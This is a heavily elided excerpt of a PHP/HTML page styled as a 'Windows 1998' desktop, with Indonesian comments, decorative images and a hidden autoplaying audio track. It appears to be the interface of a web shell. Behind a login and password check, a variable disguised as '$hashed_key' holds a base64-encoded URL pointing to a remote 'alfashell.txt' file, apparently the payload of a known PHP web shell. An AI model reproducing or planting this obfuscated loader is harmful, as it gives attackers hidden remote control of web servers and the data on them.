...
if (is_logged_in()) {
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = 'aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0'; 
...
<head>
    <meta charset="UTF-8">
    <title>Windows 1998 Tuwaga</title>
    <link rel="icon" type="image/x-icon" href="https://win98icons.alexmeub.com/icons/ico/msie1-2.ico">
    <style>
body {
    background-image: url('https://imgku.vip/images/WARBM.gif'); /* Ganti dengan URL gambar kamu */
    ...
    .logo {
      width: 400px;
      height: auto;
      margin-top: -510px; /* geser sedikit ke atas dari tengah */
    }
        .desktop-icon {
            position: absolute;
            width: 80px;
...
<body>
<img src="https://i.ibb.co.com/pjdtFjJ7/a-removebg-preview.png" alt="Logo" class="logo">
    ...
    <audio autoplay hidden>
        <source src="https://seoqwert.io/sound/Steady-Bom-Bibi.mp3" type="audio/mpeg">
    </audio>
